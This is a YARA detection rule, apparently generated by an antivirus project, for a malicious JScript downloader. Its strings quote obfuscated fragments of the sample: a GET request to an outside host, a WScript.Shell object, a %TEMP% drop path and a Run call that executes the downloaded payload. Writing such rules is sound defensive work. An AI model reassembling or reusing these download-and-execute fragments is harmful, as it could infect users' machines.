rule sig_20160427_1b221830b664eb4b23d49b56ce522ffe {
  meta:
    description = "datamaliciousorder - file 20160427_1b221830b664eb4b23d49b56ce522ffe.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "38fef03e595b5b1c214f3f3acb81702df3156536f5e6ce4126ff338b27238d7e"

  strings:
    $s1  = "PqrwfHlvsx[HduwoIlucu](\"G\" + \"ET\", \"http://totaltransport.com.br/n7dus\", false);" fullword ascii
    $s2  = "var OdllxJqdxd = function LcqqvIfomm() {return UhfkmPwexw[PavlmBcdvo](\"WScript\"+\".Shell\");}(), GxzctEzwxz = 11;" fullword ascii
    $s3  = "function YfrcaFqaaa() {return OdllxJqdxd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"2ZJVClr" ascii
    $s4  = "function YfrcaFqaaa() {return OdllxJqdxd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"2ZJVClr" ascii
    $s5  = "function FhovkMulks(FtyfiBssbf, OxgitFcwqv){AptmlVshjk = AptmlVshjk * 1; return FtyfiBssbf - OxgitFcwqv;};" fullword ascii
    $s6  = "var UhfkmPwexw = this[\"WScript\"];" fullword ascii
    $s7  = "function VriciCjbbl(UycmoNovlt){OdllxJqdxd[\"R\"+\"un\"](UycmoNovlt, AptmlVshjk, AptmlVshjk);};" fullword ascii
    $s8  = "function OsfecFzwhv(FsorhMyluq) {var IxycqFtpgh = (1, 2, 3, 4, 5, FsorhMyluq); return IxycqFtpgh;};" fullword ascii
    $s9  = "if (PqrwfHlvsx[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s10 = "function BzgueGgwvw(){return SiebzSearb + \"\";};" fullword ascii
    $s11 = "function FrpbyAevzu() {return ((TxfayNqdwq == true) && (TxfayNqdwq == HcrxhMcfgu)) ? 1 : AptmlVshjk;};" fullword ascii
    $s12 = "var TxfayNqdwq = false;" fullword ascii
    $s13 = "HcrxhMcfgu = true; " fullword ascii
    $s14 = "var CguxiMuknn = new this[\"D\"+\"ate\"]();" fullword ascii
    $s15 = "function YfopkQrdot(){return PavlmBcdvo;};" fullword ascii
    $s16 = "function MinpuFfutb()" fullword ascii
    $s17 = "var MmzmlTeyia = false;" fullword ascii
    $s18 = "function YtwxcIhaep(){return 23;};" fullword ascii
    $s19 = "}while (XgrewYdjau);" fullword ascii
    $s20 = "var HcrxhMcfgu = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}